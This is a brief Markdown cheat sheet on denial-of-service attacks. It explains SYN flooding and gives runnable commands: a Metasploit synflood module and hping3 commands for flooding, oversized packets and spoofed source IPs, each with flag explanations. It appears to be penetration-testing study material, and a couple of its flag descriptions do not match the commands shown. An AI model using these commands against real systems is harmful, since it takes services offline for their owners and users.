## DoS cheat sheet

### SYN Flooding
SYN flooding takes advantage of a flaw with regard to how most hosts implement the TCP three-way handshake. This attack occurs when the intruder sends unlimited SYN packets (requests) to the host system. The process of transmitting such packets is faster than the system can handle. Normally, the connection establishes with the TCP three-way handshake, and the host keeps track of the partially open connections while waiting in a listening queue for response ACK packets.

#### Using Metasploit

```sh
msfconsole
use auxiliary/dos/tcp/synflood
```

### PoD attack
The attacker tries to crash, freeze, or destabilize the targeted system or service by sending malformed or oversized packets using a simple ping command.

#### Using hping3

```sh
hping3 --d 65538 -S -p 21 --flood [Target IP]
```
-d: Specifies data size.

-S: Sets the SYN flag.

-p: Specifies the destination port.

--flood: Sends a huge number of packets.

### Spoof source IP

#### Using hping3

```sh
hping3 -S [Target IP] -a [IP Spoofed]
```
-S: Sets the SYN flag.

-a: Spoofs the IP address.

-p: Specifies the destination port.

--flood: Sends a huge number of packets.


### UDP application layer flood attack

#### Using hping3

```sh
hping3 -2 -p 139 --flood [Target IP]
```
-2: Specifies the UDP mode.

-p: Specifies the destination port.

--flood: Sends a huge number of packets.


## License

© 2021 [javierizquierdovera.com](https://javierizquierdovera.com)

Licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0) ([`LICENSE-APACHE`](LICENSE-APACHE)) or the [MIT license](https://opensource.org/licenses/MIT) ([`LICENSE-MIT`](LICENSE-MIT)), at your option.

`SPDX-License-Identifier: (Apache-2.0 OR MIT)`